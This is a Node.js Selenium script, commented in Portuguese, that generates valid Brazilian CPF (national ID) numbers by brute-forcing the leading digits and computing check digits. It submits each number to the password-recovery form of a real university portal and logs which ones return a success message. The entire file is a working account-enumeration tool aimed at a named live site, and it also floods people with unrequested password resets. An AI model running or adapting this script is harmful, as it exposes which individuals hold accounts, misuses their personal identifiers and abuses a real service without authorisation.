const { Builder, By, Key, until } = require('selenium-webdriver');
const readline = require('readline-sync');

function calcularDigito(cpfArray, peso) {
    let soma = 0;
    for (let i = 0; i < cpfArray.length; i++) {
        soma += cpfArray[i] * peso;
        peso--;
    }
    let resto = soma % 11;
    return resto < 2 ? 0 : 11 - resto;
}

function calcularCPFComFaixa(tentativas, faixa) {
    const cpfs = [];
    for (let i = 1; i <= tentativas; i++) {
        let prefixo = i.toString().padStart(3, '0');
        let cpfSemVerificadores = prefixo + faixa;
        const cpfArray = cpfSemVerificadores.split('').map(Number);
        const primeiroDigito = calcularDigito(cpfArray, 10);
        cpfArray.push(primeiroDigito);
        const segundoDigito = calcularDigito(cpfArray, 11);
        const cpfCompleto = cpfSemVerificadores + primeiroDigito + segundoDigito;
        cpfs.push(cpfCompleto);
    }
    return cpfs;
}

async function abrirSiteComAutomacao(driver, cpf) {
    await driver.get('https://saga2.faccat.br/index.php?op=1068');

    try {
        let inputs = await driver.wait(until.elementsLocated(By.name('login')), 10000);
        let textInput = inputs[1];
        await textInput.sendKeys(cpf);

        let confirmarButton = await driver.findElement(By.id('botao_recuperar_senha'));
        await confirmarButton.click();

        await driver.sleep(5000);

        let popUpVisible = await driver.findElements(By.css('.alert.alert-success'));
        if (popUpVisible.length > 0) {
            return { cpf };
        }
    } catch (error) {
        console.error(`Erro ao processar CPF ${cpf}:`, error);
    }
    return null;
}

async function executarAutomacao(driver, cpfs) {
    const popUps = [];

    for (let cpf of cpfs) {
        const result = await abrirSiteComAutomacao(driver, cpf);
        if (result) {
            popUps.push(result.cpf);
        }
    }

    if (popUps.length > 0) {
        console.log('Pop-ups destacados:');
        popUps.forEach(cpf => {
            console.log(`CPF: ${cpf}`);
        });
    } else {
        console.log('Nenhum pop-up destacado.');
    }
}

async function main() {
    const tentativas = readline.question("Informe o valor maximo dos tres primeiros numeros: ");

    if (tentativas <= 0 || tentativas > 999 || isNaN(tentativas)) {
        console.log("Por favor, insira um valor entre 1 e 999.");
        return;
    }

    const faixa = readline.question("Digite os 6 digitos intermediarios do CPF: ");

    if (faixa.length !== 6 || isNaN(faixa)) {
        console.log("Por favor, insira exatamente 6 digitos numericos.");
        return;
    }

    const cpfs = calcularCPFComFaixa(tentativas, faixa);

    let driver = await new Builder().forBrowser('chrome').build();
    try {
        await executarAutomacao(driver, cpfs);
    } finally {
        await driver.quit();
    }
}

main().catch(console.error);
